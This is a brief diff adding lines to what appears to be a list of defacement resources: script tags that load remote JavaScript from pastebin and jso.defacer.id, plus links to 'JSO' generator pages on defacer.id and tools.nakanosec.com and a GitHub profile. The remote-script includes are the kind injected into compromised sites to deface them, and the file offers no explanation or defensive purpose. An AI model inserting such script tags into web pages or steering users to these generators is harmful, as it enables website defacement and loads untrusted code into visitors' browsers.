@@ -20,3 +20,15 @@ https://tools.prinsh.com/home/?index
 https://tools.prinsh.com/home/?tools=jso
 
 <script type="text/javascript" src="https://pastebin.com/raw/J5yQMDVp"></script>
+
+
+
+<script src="https://jso.defacer.id/raw/27j4h2ldx7"></script>
+
+https://github.com/AyGemuy/AyGemuy?tab=readme-ov-file
+
+https://defacer.id/tools/jso-generator
+
+
+https://tools.nakanosec.com/jso.html
+
